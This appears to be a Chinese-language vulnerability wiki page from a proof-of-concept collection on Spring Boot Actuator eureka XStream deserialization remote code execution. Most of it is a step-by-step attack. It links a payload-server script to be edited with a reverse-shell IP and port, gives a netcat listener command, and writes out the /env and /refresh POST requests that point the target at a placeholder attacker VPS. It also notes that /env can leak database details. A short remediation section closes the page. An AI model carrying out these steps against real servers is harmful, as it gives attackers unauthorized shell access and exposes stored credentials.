# eureka xstream deserialization RCE

## 利用条件：
 - 可以 POST 请求目标网站的 /env 接口设置属性
 - 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖）
 - 目标使用的 eureka-client < 1.8.7（通常包含在 spring-cloud-starter-netflix-eureka-client 依赖中）
 - 目标可以请求攻击者的 HTTP 服务器（请求可出外网）

## 利用方法：

#### 访问`/env`，查找存在`eureka-client`依赖
#### 架设响应恶意 XStream payload 的网站
使用 python3 在自己控制的服务器上运行[脚本](https://github.com/7estUser/WIKI-POC/blob/main/Wiki/开发框架漏洞/Spring/Actuator(eureka%20xstream%20deserialization%20RCE)/file/example.py)，并根据实际情况修改脚本中反弹shell的 ip 地址和 端口号。
#### nc 监听反弹 shell 的端口
`nc -lvnp 8446`
#### 设置 eureka.client.serviceUrl.defaultZone 属性
spring 1.x
```bash
POST /env
Host: x.x.x.x
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://<yourvpsip>:2222/example
```
spring 2.x
```bash
POST /actuator/env
Host: x.x.x.x
Content-Type: application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://<yourvpsip>:2222/example"}
```
![](https://github.com/7estUser/WIKI-POC/blob/main/Wiki/开发框架漏洞/Spring/Actuator/img/request.png)

#### 刷新配置
spring 1.x
```bash
POST /refresh
Host: x.x.x.x
Content-Type: application/x-www-form-urlencoded
```
spring 2.x
```bash
POST /actuator/refresh
Host: x.x.x.x
Content-Type: application/json
```
![](https://github.com/7estUser/WIKI-POC/blob/main/Wiki/开发框架漏洞/Spring/Actuator/img/refreh.png)
#### 服务器接收到shell，并且能成功执行命令

> ⚠️ 同时访问/env端点获取全部环境属性，由于 actuator 会监控站点 mysql、mangodb 之类的数据库服务，所以通过监控信息有时可以展示mysql、mangodb 数据库信息.

## 漏洞原理：
1. eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址
2. refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload
3. 目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞

## 漏洞分析：
 - Actuator是Spring Boot提供的服务监控和管理中间件，默认配置会出现接口未授权访问，部分接口会泄露网站流量信息和内存信息等，使用Jolokia库特性甚至可以远程执行任意代码，获取服务器权限
 - XStream：XStream是Java类库，用来将对象序列化成XML （JSON）或反序列化为对象。
 - /env端点配置不当造成RCE

## 漏洞修复
### 一 禁用所有接口：
`endpoints.enabled = false`

### 二 pom.xml文件引入spring-boot-starter-security依赖：
```bash
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-security</artifactId>
</dependency>
```

### 三 开启security功能，配置访问权限验证，类似配置如下：
```bash
management.port=8099
management.security.enabled=true
security.user.name=xxxxx
security.user.password=xxxxxx
```